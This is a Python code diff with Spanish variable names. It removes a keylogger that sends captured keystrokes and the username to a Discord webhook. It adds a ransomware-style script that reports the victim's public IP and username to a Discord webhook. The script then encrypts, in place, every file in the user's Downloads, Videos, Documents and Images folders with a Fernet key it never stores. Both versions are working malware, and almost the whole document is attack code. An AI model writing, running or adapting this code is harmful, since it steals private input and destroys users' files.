@@ -1,59 +1,43 @@
-from pynput.keyboard import Key, Listener
+import os
 import getpass
+from cryptography.fernet import Fernet, InvalidToken  
 import requests
-import time
-import threading
+from pynput.keyboard import Key, Listener
 
-webhook = "Tu webhook"
+url = "https://api.ipify.org"
 usuario = getpass.getuser()
+ip = requests.get(url).text
+webhook = "Ingresa aqui tu webhook de discord."
+data = {
+    "content": f"IP: {ip} \n Usuario: {usuario}"
+}
 
-buffer = []
-last_time = time.time()
-inactivity_timeout = 10
+requests.post(webhook, json=data)
 
-def presionar_tecla(key):
-    global last_time
-    last_time = time.time()
-    try:
-        if isinstance(key, Key):
-            if key == Key.space:
-                buffer.append(" ")
-            elif key == Key.enter:
-                buffer.append("\n")
-                enviar_datos()
-            elif key in {Key.shift, Key.shift_r, Key.shift_l, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.esc, Key.backspace, Key.caps_lock}:
-                return
-            else:
-                buffer.append(f"[{str(key)}]")
-        else:
-            buffer.append(str(key).replace("'", ""))
-    except:
-        pass
 
-def enviar_datos():
-    global buffer
-    if buffer:
-        mensaje = "".join(buffer)
-        if mensaje.strip():
-            payload = {"content": f"Usuario: {usuario}\nMensaje: {mensaje}"}
-            try:
-                requests.post(webhook, json=payload)
-            except:
-                pass
-        buffer.clear()
+clave = Fernet.generate_key()
+obj = Fernet(clave)
 
-def verificar_inactividad():
-    while True:
-        time.sleep(inactivity_timeout)
-        if time.time() - last_time >= inactivity_timeout and buffer:
-            enviar_datos()
+directorios = [
+    fr"C:/Users/{usuario}/Downloads",
+    fr"C:/Users/{usuario}/Videos",
+    fr"C:/Users/{usuario}/Documents",
+    fr"C:/Users/{usuario}/Images"
+              ]
 
-threading.Thread(target=verificar_inactividad, daemon=True).start()
+for directorio in directorios:
 
-def soltar_tecla(key):
-    if key == Key.esc:
-        return False
+    for archivo in os.listdir(directorio):
+       ruta_completa = os.path.join(directorio, archivo)
 
-with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
-    listener.join()
+       if os.path.isfile(ruta_completa):
+           try:
+               with open(ruta_completa, "rb") as file:
+                contenido = file.read()
+                contenido_encriptado = obj.encrypt(contenido)
 
+                with open(ruta_completa, "wb") as file:
+                    file.write(contenido_encriptado)
+
+           except (PermissionError, OSError):
+                pass  
